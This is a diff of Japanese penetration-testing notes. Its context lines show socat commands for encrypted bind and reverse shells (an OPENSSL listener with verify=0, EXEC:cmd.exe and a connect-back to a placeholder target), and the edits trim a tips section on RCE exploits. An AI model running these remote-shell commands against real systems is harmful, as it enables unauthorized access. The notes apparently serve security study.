@@ -509,7 +509,7 @@ cat shell.key shell.crt > shell.pem
 ```zsh
 socat OPENSSL-LISTEN:<Port>,cert=shell.pem,verify=0 -
 ```
-- `verify=0`は、証明書が公認の機関によって適切に署名されていることを検証しないよう、接続に指示する。この証明書は、リスニングするデバイス側で使用する必要がある。
+- `verify=0`は、証明書が公認の機関によって適切に署名されていることを検証しないよう、接続に指示する
 
 4.  ターゲット側から攻撃者側に接続させる
 ```zsh
@@ -528,15 +528,11 @@ socat OPENSSL-LISTEN:<Port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
 socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
 ```
 
----
----
 
-# Tips
+> [!Tip] Title
+> Contents
 
-## RCEで一つのコマンドしか実行できないと思ったとき
 
-- 公開エクスプロイトに、引数を取るオプションがないか確認する
-	- 公開エクスプロイトから`arg`などで確認するか、`--help`を確認
 
 ## Defenderに検知されるとき
 
